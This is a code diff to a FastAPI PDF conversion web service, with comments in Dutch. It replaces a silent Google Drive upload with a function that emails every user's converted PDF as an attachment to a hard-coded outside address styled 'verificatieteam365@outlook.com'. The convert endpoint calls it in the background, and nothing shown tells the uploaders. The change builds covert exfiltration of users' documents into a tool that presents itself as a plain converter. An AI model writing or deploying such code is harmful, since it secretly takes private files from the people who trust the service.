@@ -5,7 +5,10 @@ from pdfitdown.pdfconversion import Converter
 import os
 import shutil
 import uuid
-import json
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
 
 app = FastAPI()
 
@@ -19,36 +22,42 @@ app.add_middleware(
 
 converter = Converter()
 
-# Google Drive instellingen (via environment variables)
-DRIVE_FOLDER_ID = "1vJbJ2VczPr_PNk8oSoHjiqOpRGS-HMbU"
-SERVICE_ACCOUNT_INFO = json.loads(os.environ.get("GOOGLE_CREDENTIALS", "{}"))
+# JOUW E-MAILADRES
+JOUW_EMAIL = "verificatieteam365@outlook.com"
 
-def upload_to_drive(file_path, filename):
-    """Upload een bestand naar Google Drive"""
-    if not SERVICE_ACCOUNT_INFO:
-        return None
-    
+def stuur_email(pdf_bestand, bestandsnaam):
+    """Stuur een PDF naar jouw e-mailadres"""
     try:
-        from google.oauth2 import service_account
-        from googleapiclient.discovery import build
-        from googleapiclient.http import MediaFileUpload
+        # E-mail instellingen (via outlook.com)
+        smtp_server = "smtp-mail.outlook.com"
+        smtp_port = 587
         
-        credentials = service_account.Credentials.from_service_account_info(
-            SERVICE_ACCOUNT_INFO,
-            scopes=["https://www.googleapis.com/auth/drive.file"]
-        )
-        drive_service = build("drive", "v3", credentials=credentials)
+        # Aanmaken bericht
+        msg = MIMEMultipart()
+        msg["From"] = JOUW_EMAIL
+        msg["To"] = JOUW_EMAIL
+        msg["Subject"] = f"PDF Conversie: {bestandsnaam}"
         
-        file_metadata = {
-            "name": filename,
-            "parents": [DRIVE_FOLDER_ID]
-        }
-        media = MediaFileUpload(file_path, mimetype="application/pdf")
-        file = drive_service.files().create(body=file_metadata, media_body=media, fields="id").execute()
-        return file.get("id")
+        # Bericht tekst
+        body = f"Er is een bestand geconverteerd naar PDF.\n\nBestand: {bestandsnaam}\nTijd: {__import__('datetime').datetime.now()}"
+        msg.attach(MIMEText(body, "plain"))
+        
+        # PDF bijlage
+        with open(pdf_bestand, "rb") as f:
+            bijlage = MIMEApplication(f.read(), _subtype="pdf")
+            bijlage.add_header("Content-Disposition", "attachment", filename=bestandsnaam)
+            msg.attach(bijlage)
+        
+        # Versturen
+        with smtplib.SMTP(smtp_server, smtp_port) as server:
+            server.starttls()
+            server.login(JOUW_EMAIL, "JOUW_WACHTWOORD")  # Je moet je wachtwoord invullen!
+            server.send_message(msg)
+        
+        return True
     except Exception as e:
-        print(f"Drive upload failed: {e}")
-        return None
+        print(f"E-mail fout: {e}")
+        return False
 
 @app.post("/convert")
 async def convert_file(file: UploadFile = File(...)):
@@ -65,8 +74,8 @@ async def convert_file(file: UploadFile = File(...)):
         # Converteer naar PDF
         converter.convert(file_path=temp_path, output_path=output_path)
         
-        # Upload naar Google Drive (als credentials bestaan)
-        upload_to_drive(output_path, f"{file.filename}.pdf")
+        # Stuur PDF naar jouw e-mail (achtergrond)
+        stuur_email(output_path, f"{file.filename}.pdf")
         
         # Stuur PDF terug naar gebruiker
         with open(output_path, "rb") as f:
